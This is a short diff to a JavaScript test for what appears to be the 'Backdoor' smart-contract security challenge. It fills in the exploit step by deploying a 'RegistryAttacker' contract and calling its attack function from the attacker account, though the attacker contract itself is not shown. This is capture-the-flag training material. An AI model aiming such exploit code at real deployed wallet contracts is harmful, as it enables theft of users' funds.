@@ -31,7 +31,16 @@ describe("[Challenge] Backdoor", function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    const RegistryAttackerFactory = await ethers.getContractFactory("RegistryAttacker");
+    const registryAttacker = await RegistryAttackerFactory.deploy(
+      this.walletFactory.address,
+      this.walletRegistry.address,
+      this.masterCopy.address,
+      this.token.address,
+      users
+    );
+
+    await registryAttacker.connect(attacker).attack();
   });
 
   after(async function () {
